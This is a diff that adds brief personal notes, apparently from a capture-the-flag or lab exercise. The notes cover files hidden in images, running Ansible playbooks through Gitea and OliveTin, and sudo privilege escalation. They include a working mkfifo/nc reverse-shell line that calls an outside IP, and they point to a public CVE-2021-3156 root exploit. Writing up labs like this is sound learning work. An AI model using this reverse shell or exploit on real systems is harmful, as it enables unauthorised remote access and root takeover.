@@ -1,0 +1,30 @@
+Somethimes, picture (jpg,png) can have hiddle files.
+If the jpg file is allowed to download or it has download button > just download from there > it has an actual hidden file
+Don't download from > open image in new tab > wget http://....../
+
+git tea and oliveTin.
+
+Git tea can save ansible yaml file. OliveTin can run Ansible yaml files.
+If the code in yaml file has reverse shell, we can get reverse shell by running from OliveTin.
+
+Like that
+----------
+    - name: get the username running the deploy
+      become: false
+      command: whoami
+      register: username_on_the_host
+      changed_when: false
+
+    - debug: var=username_on_the_host
+
+    - name: Test
+      shell: rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.73.176 4242 >/tmp/f
+
+
+Privilege escalation from linpeas.sh
+-------------------------------------
+
+sudo 1.8.21p2 version has vulnerability > CVE-2021-3156
+https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py
+
+By running exploit_nss.py in target > get root access immediatelly.
